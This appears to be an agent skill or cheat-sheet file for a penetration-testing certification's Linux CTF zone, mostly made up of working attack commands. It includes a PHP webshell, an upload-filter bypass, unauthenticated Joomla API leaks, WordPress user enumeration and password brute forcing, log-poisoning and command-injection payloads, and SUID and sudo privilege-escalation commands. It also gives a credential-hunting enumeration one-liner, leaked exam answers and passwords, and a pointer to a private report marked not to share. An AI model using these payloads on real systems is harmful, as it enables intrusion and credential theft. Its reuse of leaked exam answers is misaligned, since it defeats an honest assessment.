# Zone 2 — Linux CTF (web + privesc boxes)

Prior range: `192.168.200.0/24` (excl `.1`, `.100`), three Linux hosts: a
PHP/MySQL ticketing app, a Joomla box, an Apache/WordPress box.
Full evidence (PRIVATE, do not share): `~/.config/opencode/skills/cpent-exam/private/CPENT_CTF_Report.md` (PDF adds henry
`brent3`/`admhc1` + CVE-2021-3156 root path).
Load with: `ctf-web`, `ctf-privesc`. Tools: toolkit.md §3, §8.

## Recon per host

```bash
nmap -sC -sV -Pn -T4 <ip>                     # 22/80/443/21 typical
gobuster dir -u http://<ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak
curl -s http://<ip>/ | grep -oE 'wp-content|joomla'   # CMS fingerprint
```

## Web foothold chains that worked

**SQLi (UNION, mask-driven extraction):**
```bash
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
# column count sweep: UNION SELECT 1,2,3,4,5 -- note WHICH columns echo
# then database(), version(), information_schema.tables → table data
# base64-looking column values: echo dUcwdG0zYjRjaw== | base64 -d
```

**Upload filter bypass → LFI-include RCE:**
- Inspect the upload form for hidden fields (`allow_all=0`) → override to `1`,
  keep `.png` filename rule satisfied but send PHP content-type/body.
- If `download.php?file=` renders the stored file via `include()` — uploaded PHP
  executes. Webshell: `<?php system($_GET['c']); ?>`.

**Joomla:**
```bash
curl -s http://IP/joomla/administrator/manifests/files/joomla.xml | grep -i version
# CVE-2023-23752 (4.0.0-4.2.7): unauth config + user leak:
curl -s "http://IP/joomla/api/index.php/v1/users?public=true"
curl -s "http://IP/joomla/api/index.php/v1/config/application?public=true"
```
Admin → template editor → prepend webshell to cassiopeia `error.php` BEFORE the
`defined('_JEXEC') or die` guard.

**WordPress:**
```bash
for i in 1 2 3 4 5; do curl -s -o /dev/null -w "%{redirect_url}\n" "http://IP/?author=$i"; done
curl -s http://IP/wp-content/plugins/<name>/readme.txt | grep -i "stable tag"
# brute with mask-filtered list: grep -aE '^[a-z]{5}[0-9]$' rockyou.txt
# oracle: 302 + wordpress_logged_in cookie = success (verify vs known-bad first)
```

## Privesc patterns that worked

### v2-documented extras (2026 report): expect at least one of these

| Technique | Key commands |
|---|---|
| **Log poisoning → LFI** | inject `<?php system($_GET['c']);?>` into /var/log/apache2/access.log via User-Agent, then LFI `?file=/var/log/apache2/access.log&c=id` |
| **Git exposure** | `/.git/` found by gobuster → `pipx install git-dumper; git-dumper http://IP/.git/ ./site` → `git log -p`, deleted configs, stash |
| **OTP brute force** | 4-6 digit OTP with no rate limit → iterate with python/curl; also test OTP reusability |
| **Command injection** | `;id`, `` `id` ``, `$(id)` in any exec-looking param (ping/traceroute/diagnostic forms) |
| Kernel privesc family | PwnKit (CVE-2021-4034), DirtyCow, Shellshock, eBPF (CVE-2017-16995) |

| Pattern | Command |
|---|---|
| SUID bash | `/var/www/suid_bash -p` (GTFOBins; `-p` keeps euid 0). File-size question: `stat -c "%s"` |
| cap_setuid binary | `/path/php -r 'posix_setuid(0); system("id; cat /root/root.txt");'` |
| Old sudo (1.8.x) | CVE-2021-3156 Baron Samedit: check `sudoedit -s '\' $(python3 -c "print(\"A\"*1000)")` → heap overflow PoC |
| Shadow crack | dump `/etc/shadow` as root → `john` + **mask-regex candidates scraped on-box**: `grep -rhoaE "[A-Z][a-z]{3}[0-9][a-z]{3}[0-9]" /home /root /opt /var \| sort -u` |

## The post-foothold one-liner (run on every shell)

```bash
echo "=== ID ==="; id; echo "=== SUDO ==="; sudo -n -l 2>/dev/null; echo "=== CAPS ==="; getcap -r / 2>/dev/null; echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null; echo "=== KERNEL ==="; uname -a; sudo --version | head -1; echo "=== USERS ==="; grep -vE 'nologin|false$' /etc/passwd; echo "=== CRON ==="; cat /etc/crontab; crontab -l 2>/dev/null; echo "=== WWFILES ==="; find / -perm -o+w -type f 2>/dev/null | grep -vE '^/(proc|sys)'; echo "=== CREDS ==="; grep -rniE 'password|passwd|secret|api[_-]?key|db_pass' /var/www /opt /srv /home 2>/dev/null | head -30; echo "=== SSH ==="; ls -la ~/.ssh /home/*/.ssh 2>/dev/null; echo "=== DONE ==="
```
The `sudo --version` line is what surfaces Baron Samedit. The creds grep feeds
both answer questions and cross-host reuse.

## Answer gotchas

- SSH private-key questions: "first 6 chars of the body" = base64 AFTER the
  BEGIN line (`b3Blbn` for OpenSSH keys).
- root.txt/local.txt fragments: mask applies to file contents, sometimes minus
  wrapper chars — read twice, count once.
- Two-password conflicts (brent3 vs admhc1): submit later-written candidate
  first, keep both on record.
- FTP anonymous dirs (`hole/`) hold users.txt/pass.txt — feed straight into
  cross-service sprays BEFORE rockyou.
